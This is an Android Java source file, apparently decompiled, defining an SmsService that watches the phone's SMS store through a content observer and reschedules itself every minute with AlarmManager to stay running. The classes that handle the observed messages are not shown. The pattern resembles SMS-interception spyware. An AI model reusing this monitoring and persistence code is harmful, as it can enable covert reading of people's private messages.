package shared.library.us;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class SmsService extends Service {
    private static final long INITIAL_RETRY_INTERVAL = 60000;
    private static final long MAXIMUM_RETRY_INTERVAL = 60000;
    private static final String SERVICE_START = "shared.library.us.START";
    private static final String SERVICE_START_SMS = "shared.library.us.SMS_START";
    private static final String SERVICE_STOP = "shared.library.us.STOP";
    private static final String TAG = "SmsService";
    private static Context ctx;
    private ContentResolver cResolver = null;
    private boolean isStarted = false;
    private ContentObserver mObserver = null;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void startService(Context context) {
        Intent i = new Intent(context, SmsService.class);
        Log.i("live", "package name 1: " + context.getPackageName());
        i.setAction(SERVICE_START);
        context.startService(i);
        ctx = context;
    }

    public static void stopService(Context context) {
        Intent i = new Intent(context, SmsService.class);
        i.setAction(SERVICE_STOP);
        ctx = context;
        ctx.startService(i);
    }

    public static void startKeepAliveService(Context context) {
        Log.i("live", "package name 2: " + context.getPackageName());
        try {
            Intent i = new Intent(context, SmsService.class);
            i.setAction(SERVICE_START_SMS);
            context.startService(i);
            ctx = context;
        } catch (Exception e) {
            Log.i(TAG, e.getMessage());
        }
    }

    public void onStart(Intent intent, int startId) {
        String str = TAG;
        super.onStart(intent, startId);
        try {
            if (intent.getAction().equals(SERVICE_START)) {
                start();
            } else if (intent.getAction().equals(SERVICE_STOP)) {
                if (this.cResolver != null) {
                    this.cResolver.unregisterContentObserver(this.mObserver);
                }
                Log.i(TAG, "SmsService Stopped : ");
                stopSelf();
            } else if (intent.getAction().equals(SERVICE_START_SMS)) {
                startSms();
            }
        } catch (Exception e) {
            Exception e2 = e;
            String str2 = TAG;
            Log.i(str, "onStart : " + e2.getMessage());
        }
    }

    private synchronized void startSms() {
        try {
            this.cResolver = getContentResolver();
            this.mObserver = new SmsObserver(new SmsHandler(), ctx);
            this.cResolver.registerContentObserver(Uri.parse("content://sms"), true, this.mObserver);
        } catch (Exception e) {
            Log.i(TAG, "startSms : " + e.getMessage());
        }
        return;
    }

    public void onCreate() {
        super.onCreate();
    }

    private void scheduleSms(long startTime) {
        long interval;
        Log.i(TAG, "scheduleSms " + startTime);
        long now = System.currentTimeMillis();
        if (now - startTime < 60000) {
            interval = Math.min(4 * 60000, 60000);
        } else {
            interval = 60000;
        }
        Intent i = new Intent();
        i.setClass(this, SmsService.class);
        i.setAction(SERVICE_START_SMS);
        ((AlarmManager) getSystemService("alarm")).set(0, now + interval, PendingIntent.getService(this, 0, i, 0));
    }

    private synchronized void start() {
        try {
            if (!this.isStarted) {
                this.isStarted = true;
                try {
                    scheduleSms(System.currentTimeMillis());
                } catch (Exception e) {
                }
            }
        } catch (Exception e2) {
            Log.e(TAG, e2.getMessage());
        }
        return;
    }

    private synchronized void stop() {
        try {
            if (this.isStarted) {
                stopSelf();
                this.isStarted = false;
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
        return;
    }
}
